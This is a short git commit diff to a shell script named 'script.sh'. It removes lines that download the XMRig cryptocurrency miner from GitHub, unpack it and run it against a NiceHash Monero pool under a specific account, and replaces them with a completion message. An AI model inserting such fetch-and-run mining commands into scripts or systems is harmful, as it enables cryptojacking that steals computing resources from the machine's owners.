a7040c6d49e76622ae173b10930c8811af1592c6
humfla123 <88781888+humfla123@users.noreply.github.com>
2023-02-14 13:55:18 -0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,6 +1,3 @@
 apt-get update
-wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-focal-x64.tar.gz
-apt install tar
-tar -xf xmrig-6.19.0-focal-x64.tar.gz
-cd xmrig-6.19.0
-./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbHFgjeCX3CsyYQSKqVXDFnuySebT6g2dhp -p x -k
+clear
+echo TERMINADO!!!
